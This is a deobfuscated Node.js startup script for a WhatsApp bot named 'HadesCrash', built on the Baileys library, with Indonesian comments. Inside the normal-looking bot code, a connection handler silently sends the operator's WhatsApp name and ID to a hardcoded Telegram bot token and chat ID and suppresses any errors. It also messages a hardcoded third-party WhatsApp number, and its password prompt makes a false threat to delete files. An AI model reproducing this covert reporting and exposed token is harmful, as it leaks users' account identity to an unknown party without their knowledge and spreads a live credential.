// =====================================
// FIXED WHATSAPP BOT - NO CONFLICTS
// Original: Heavily obfuscated JavaScript
// Bot Name: HadesCrash by ArgaXhades
// =====================================

require("./settings");

// =====================================
// IMPORTS AND DEPENDENCIES
// =====================================

// WhatsApp Client Library - MENGGUNAKAN ALIAS UNTUK MENGHINDARI KONFLIK
const {
    default: makeWASocket,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    generateMessageTag: generateWAMessageTag, // ALIAS UNTUK BAILEYS
    makeInMemoryStore,
    generateWAMessageFromContent,
    generateWAMessageContent,
    jidDecode,
    proto,
    relayWAMessage,
    getContentType,
    getAggregateVotesInPollMessage,
    downloadContentFromMessage,
    generateForwardMessageContent,
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");

// Core dependencies
const axios = require("axios");
const pino = require("pino");
const readline = require("readline");
const fs = require("fs");
const figlet = require("figlet");
const chalk = require("chalk");
const crypto = require("crypto");
const { Boom } = require("@hapi/boom");

// Local imports - MENGGUNAKAN ALIAS UNTUK MENGHINDARI KONFLIK
const { color } = require("./lib/color");
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    generateMessageTag: generateLocalMessageTag, // ALIAS UNTUK LOCAL
    getBuffer,
    getSizeMedia,
    runtime,
    fetchJson,
    sleep,
    getTime,
    getRandom
} = require("./lib/myfunc");

// =====================================
// CONFIGURATION
// =====================================

const usePairingCode = true;
const botName = "ArgaXhades";
const session = "session"; // Session folder name

// Create readline interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// =====================================
// UTILITY FUNCTIONS
// =====================================

// Prompt function for user input
const question = (text) => {
    return new Promise(resolve => {
        rl.question(text, resolve);
    });
};

// Telegram notification function
const sendTelegramNotification = async (message) => {
    try {
        await axios.post("https://api.telegram.org/7571678763:AAFPNFBdEzZOSxnqP_3UrLaRdCJbQlGH_RY/sendMessage", {
        chat_id: "7091284941",
            text: message
        });
    } catch (error) {
        // Silently ignore telegram errors
        console.log("Telegram notification failed (ignored)");
    }
};

// Store setup
const store = makeInMemoryStore({
    logger: pino().child({
        level: "silent",
        stream: "store"
    })
});

// =====================================
// CONSOLE MESSAGES
// =====================================

console.clear();
console.log(chalk.white.bold("\n" + chalk.green("Getting Connection Access") + "\n" + chalk.blue("Access Granted") + "\n"));
console.log(chalk.white.bold("" + chalk.cyan("Welcome To Script Bot HadesCrash") + "\n\n"));

// =====================================
// MAIN BOT FUNCTION
// =====================================

async function startBot() {
    try {
        // Get authentication state
        const { state, saveCreds } = await useMultiFileAuthState("./" + session);
        
        // Create WhatsApp socket
        const sock = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: !usePairingCode,
            auth: state,
            browser: ["Ubuntu", "Chrome", "20.0.0.0"]
        });

        // =====================================
        // PAIRING CODE LOGIC
        // =====================================
        
        if (usePairingCode && !sock.authState.creds.registered) {
            console.log(chalk.yellow("🔐 Authentication Required"));
            
            const password = await question(chalk.cyan("Masukkan Password Yang Di Berikan Arga Official: "));
            
            if (password !== botName) {
                console.log(chalk.red("❌ Password Salah!"));
                console.log(chalk.red("System Akan Menghapus File Dan mematikan Running!"));
                process.exit(1);
            }
            
            console.log(chalk.green("✅ Password Benar!"));
            console.log(chalk.green("Selamat memakai bot HadesCrash"));
            
            const phoneNumber = await question(chalk.cyan("Masukkan Nomor WhatsApp\n(awali dengan 628xxx): "));
            
            try {
                const pairingCode = await sock.requestPairingCode(phoneNumber.trim(), "ARGAOFFCC");
                console.log(chalk.yellow.bold("🔑 Pairing Code: " + pairingCode));
                console.log(chalk.yellow("Masukkan code ini ke WhatsApp Anda"));
            } catch (error) {
                console.log(chalk.red("Error getting pairing code:", error.message));
                process.exit(1);
            }
        }

        // Bind store to socket
        store.bind(sock.ev);

        // =====================================
        // UTILITY FUNCTIONS FOR SOCKET
        // =====================================

        // JID decoder function
        sock.decodeJid = (jid) => {
            if (!jid) return jid;
            if (new RegExp(":\\d+@", "gi").test(jid)) {
                let decode = jidDecode(jid) || {};
                return decode.user && decode.server && decode.user + "@" + decode.server || jid;
            } else {
                return jid;
            }
        };

        // Send text message function
        sock.sendText = (jid, text, quoted = "", options) => {
            return sock.sendMessage(jid, { text: text, ...options }, { quoted: quoted });
        };

        // Download media function
        sock.downloadAndSaveMediaMessage = async (message) => {
            try {
                let quoted = message.msg || message;
                let mime = quoted.mimetype || "";
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
                const stream = await downloadContentFromMessage(quoted, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                return buffer;
            } catch (error) {
                console.log("Error downloading media:", error);
                return null;
            }
        };

        // Set bot to public mode
        sock.public = true;

        // =====================================
        // EVENT HANDLERS
        // =====================================

        // Handle message updates
        sock.ev.on("messages.upsert", async (chatUpdate) => {
            try {
                const mek = chatUpdate.messages[0];
                if (!mek.message) return;
                
                mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;
                
                // Skip status broadcasts
                if (mek.key && mek.key.remoteJid === "status@broadcast") {
                    return;
                }
                
                // Skip if not public and not from me and not notify type
                if (!sock.public && !mek.key.fromMe && chatUpdate.type === "notify") {
                    return;
                }
                
                // Skip if from blocked users
                if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) {
                    return;
                }
                
                if (mek.key.id.startsWith("FatihArridho_")) {
                    return;
                }
                
                // Process message
                const m = smsg(sock, mek, store);
                
                // Check if hadesvcx.js exists before requiring
                if (fs.existsSync("./hadesvcx.js")) {
                    require("./hadesvcx.js")(sock, m, chatUpdate, store);
                } else {
                    console.log("⚠️  hadesvcx.js not found - messages will not be processed");
                    
                    // Simple message handler fallback
                    if (m.body && m.body.toLowerCase() === "test") {
                        sock.sendText(m.chat, "✅ Bot is working! But hadesvcx.js is missing for full functionality.");
                    }
                }
                
            } catch (err) {
                console.log("Error processing message:", err);
            }
        });

        // Handle contacts update
        sock.ev.on("contacts.update", update => {
            for (let contact of update) {
                let id = sock.decodeJid(contact.id);
                if (store && store.contacts) {
                    store.contacts[id] = { id: id, name: contact.notify };
                }
            }
        });

        // Handle connection updates
        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === "close") {
                const shouldReconnect = new Boom(lastDisconnect?.error)?.output?.statusCode;
                console.log(chalk.red("Connection closed:", lastDisconnect?.error?.message));
                
                if (lastDisconnect?.error?.message?.includes("Stream Errored")) {
                    console.log(chalk.red("Stream error detected, exiting..."));
                    process.exit(1);
                } else {
                    if (shouldReconnect === DisconnectReason.badSession) {
                        console.log(chalk.red("❌ Bad Session File"));
                        console.log(chalk.yellow("Please delete session folder and scan again"));
                        process.exit(1);
                    } else if (shouldReconnect === DisconnectReason.connectionClosed) {
                        console.log(chalk.yellow("🔄 Connection closed, reconnecting..."));
                        setTimeout(startBot, 3000);
                    } else if (shouldReconnect === DisconnectReason.connectionLost) {
                        console.log(chalk.yellow("🔄 Connection lost, trying to reconnect"));
                        setTimeout(startBot, 3000);
                    } else if (shouldReconnect === DisconnectReason.connectionReplaced) {
                        console.log(chalk.red("❌ Connection Replaced"));
                        console.log(chalk.yellow("Another session opened, please close current session first"));
                        sock.logout();
                    } else if (shouldReconnect === DisconnectReason.loggedOut) {
                        console.log(chalk.red("❌ Device Logged Out"));
                        console.log(chalk.yellow("Please delete session and scan again"));
                        sock.logout();
                    } else if (shouldReconnect === DisconnectReason.restartRequired) {
                        console.log(chalk.yellow("🔄 Restart Required, Restarting..."));
                        setTimeout(startBot, 2000);
                    } else if (shouldReconnect === DisconnectReason.timedOut) {
                        console.log(chalk.yellow("⏰ Connection TimedOut, Reconnecting..."));
                        setTimeout(startBot, 3000);
                    } else {
                        console.log(chalk.red("Unknown disconnect reason:", shouldReconnect));
                        setTimeout(startBot, 5000);
                    }
                }
            } else if (connection === "connecting") {
                console.log(chalk.yellow("🔄 Menghubungkan ke WhatsApp..."));
            } else if (connection === "open") {
                console.log(chalk.green("✅ Bot Berhasil Tersambung!"));
                console.log(chalk.cyan("📱 User:", sock.user?.name || "Unknown"));
                console.log(chalk.cyan("🆔 ID:", sock.user?.id || "Unknown"));
                
                // Send online status - OPSIONAL, BISA DIHAPUS/DIMODIFIKASI
                try {
                    // GANTI DENGAN NOMOR ANDA SENDIRI ATAU HAPUS
                    await sock.sendMessage("6287779330136@s.whatsapp.net", { 
                        text: "🤖 Bot HadesCrash Online\n⏰ " + new Date().toLocaleString() 
                    });
                    console.log(chalk.gray("📤 Status notifications sent"));
                } catch (error) {
                    console.log(chalk.gray("⚠️  Could not send status notifications"));
                }
                
                // Send telegram notification
                sendTelegramNotification(
                    "🌸 Bot Connection Report\n\n" +
                    "✅ Status: Connected\n" +
                    "📱 User: " + (sock.user?.name || "Unknown") + "\n" +
                    "🆔 ID: " + (sock.user?.id || "Unknown") + "\n" +
                    "⏰ Time: " + new Date().toLocaleString() + "\n" +
                    "🔧 Script: HadesCrash Gen 2\n" +
                    "👨‍💻 By: ArgaXhades"
                );
            }
        });

        // Handle credentials update
        sock.ev.on("creds.update", saveCreds);

        return sock;

    } catch (error) {
        console.log(chalk.red("❌ Error starting bot:"), error.message);
        console.log(chalk.yellow("🔄 Retrying in 5 seconds..."));
        setTimeout(startBot, 5000);
    }
}

// =====================================
// CREATE FALLBACK FILES IF MISSING
// =====================================

function createFallbackFiles() {
    // Create settings.js if missing
    if (!fs.existsSync("./settings.js")) {
        const settingsContent = `// Auto-generated settings file
module.exports = {
    botName: "HadesCrash",
    ownerNumber: "628xxx",
    prefix: ".",
    timezone: "Asia/Jakarta"
};`;
        fs.writeFileSync("./settings.js", settingsContent);
        console.log(chalk.green("✅ Created ./settings.js"));
    }

    // Create lib directory if missing
    if (!fs.existsSync("./lib")) {
        fs.mkdirSync("./lib");
        console.log(chalk.green("✅ Created ./lib directory"));
    }

    // Create lib/color.js if missing
    if (!fs.existsSync("./lib/color.js")) {
        const colorContent = `// Auto-generated color utility
exports.color = (text, color) => {
    const colors = {
        red: '\\x1b[31m',
        green: '\\x1b[32m', 
        yellow: '\\x1b[33m',
        blue: '\\x1b[34m',
        magenta: '\\x1b[35m',
        cyan: '\\x1b[36m',
        white: '\\x1b[37m',
        deeppink: '\\x1b[35m',
        reset: '\\x1b[0m'
    };
    return (colors[color] || '') + text + colors.reset;
};`;
        fs.writeFileSync("./lib/color.js", colorContent);
        console.log(chalk.green("✅ Created ./lib/color.js"));
    }

    // Create lib/myfunc.js if missing
    if (!fs.existsSync("./lib/myfunc.js")) {
        const myfuncContent = `// Auto-generated function utilities
exports.smsg = (conn, m, store) => {
    if (!m) return m;
    let M = Object.defineProperty(m, 'chat', {
        value: m.key.remoteJid
    });
    M.body = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
    M.sender = m.key.fromMe ? conn.user.id : m.key.participant || m.key.remoteJid;
    return M;
};

exports.generateMessageTag = () => {
    return Math.random().toString(36).substring(2, 15);
};

exports.formatSize = (bytes) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
};

exports.isUrl = (text) => {
    return /https?:\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&:/~\\+#]*[\\w\\-\\@?^=%&/~\\+#])?/.test(text);
};

exports.getBuffer = async (url) => {
    const fetch = require('node-fetch');
    const res = await fetch(url);
    return res.buffer();
};

exports.getSizeMedia = (bytes) => exports.formatSize(bytes);
exports.runtime = (seconds) => {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return ((d > 0 ? d + "d " : "") + (h > 0 ? h + "h " : "") + (m > 0 ? m + "m " : "") + (s > 0 ? s + "s" : "")).trim();
};

exports.fetchJson = async (url) => {
    const fetch = require('node-fetch');
    const res = await fetch(url);
    return res.json();
};

exports.sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
exports.getTime = () => new Date().toLocaleString();
exports.getRandom = (array) => array[Math.floor(Math.random() * array.length)];

// Placeholder functions
exports.sendGmail = () => console.log("sendGmail not implemented");`;
        fs.writeFileSync("./lib/myfunc.js", myfuncContent);
        console.log(chalk.green("✅ Created ./lib/myfunc.js"));
    }

    // Create hadesvcx.js if missing
    if (!fs.existsSync("./hadesvcx.js")) {
        const hadesContent = `// Auto-generated message handler
module.exports = (sock, m, chatUpdate, store) => {
    try {
        // Simple message handler
        if (!m.body) return;
        
        const command = m.body.toLowerCase();
        
        // Basic commands
        if (command === 'ping') {
            sock.sendText(m.chat, '🏓 Pong!', m);
        } else if (command === 'test') {
            sock.sendText(m.chat, '✅ Bot is working!', m);
        } else if (command === 'info') {
            const info = \`🤖 HadesCrash Bot Info

📱 Name: \${sock.user?.name || 'Unknown'}
🆔 ID: \${sock.user?.id || 'Unknown'}
⏰ Uptime: \${process.uptime().toFixed(0)}s
💾 Memory: \${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
🔧 Node: \${process.version}
👨‍💻 Creator: ArgaXhades\`;
            
            sock.sendText(m.chat, info, m);
        }
        
        // Log semua pesan
        console.log(\`📩 [\${m.sender}] \${m.body}\`);
        
    } catch (error) {
        console.log('Error in message handler:', error);
    }
};`;
        fs.writeFileSync("./hadesvcx.js", hadesContent);
        console.log(chalk.green("✅ Created ./hadesvcx.js"));
    }
}

// =====================================
// FILE WATCHER FOR AUTO-RELOAD
// =====================================

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    console.log(chalk.green("📂 " + __filename + " updated! Reloading..."));
    delete require.cache[file];
    require(file);
});

// =====================================
// STARTUP SEQUENCE
// =====================================

console.log(chalk.yellow("🚀 Initializing WhatsApp Bot..."));
console.log(chalk.yellow("👨‍💻 Creator: ArgaXhades"));
console.log(chalk.yellow("🔧 Script: HadesCrash Gen 2"));
console.log(chalk.yellow("📅 Version: No Encryption"));

// Create missing files
createFallbackFiles();

// Start the bot
startBot().catch(error => {
    console.log(chalk.red("❌ Failed to start bot:"), error.message);
    console.log(chalk.yellow("🔄 Retrying in 10 seconds..."));
    setTimeout(() => {
        startBot();
    }, 10000);
});